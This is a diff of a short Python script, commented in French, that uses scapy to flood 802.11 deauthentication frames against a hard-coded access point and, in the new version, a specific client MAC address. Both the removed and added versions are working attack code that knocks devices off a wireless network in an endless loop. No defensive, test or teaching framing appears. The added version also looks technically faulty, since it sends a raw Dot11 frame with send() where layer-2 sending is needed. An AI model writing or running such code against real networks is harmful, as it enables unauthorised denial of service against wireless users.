@@ -1,20 +1,15 @@
-import os
-import time
-import threading
 from scapy.all import *
 
-# Configuration
-INTERFACE_WIRELESS = "wlan1"  # Interface sans fil à utiliser
-BSSID_CIBLE = "08:36:C9:98:11:A9"  # BSSID de la cible
-CANAL_CIBLE = 11  # Canal de la cible
+# Définition des variables
+interface = "wlan1"  # interface réseau à utiliser
+bssid = "08:36:C9:98:11:A9"  # adresse MAC de l'AP cible
+client = "9E:9D:0B:E7:FD:78"  # adresse MAC du client cible
 
-# Fonction pour effectuer une attaque deauth
-def attaque_deauth(bssid, canal):
-    os.system(f"iwconfig {INTERFACE_WIRELESS} channel {canal}")
-    packet = Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid)
-    sendp(packet, iface=INTERFACE_WIRELESS, count=1000, inter=0.01)
+# Fonction pour envoyer des paquets de déconnexion
+def deauth(bssid, client):
+    packet = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
+    send(packet, verbose=0)
 
-# Boucle principale
+# Envoi de paquets de déconnexion en boucle
 while True:
-    attaque_deauth(BSSID_CIBLE, CANAL_CIBLE)
-    time.sleep(0.1)
+    deauth(bssid, client)
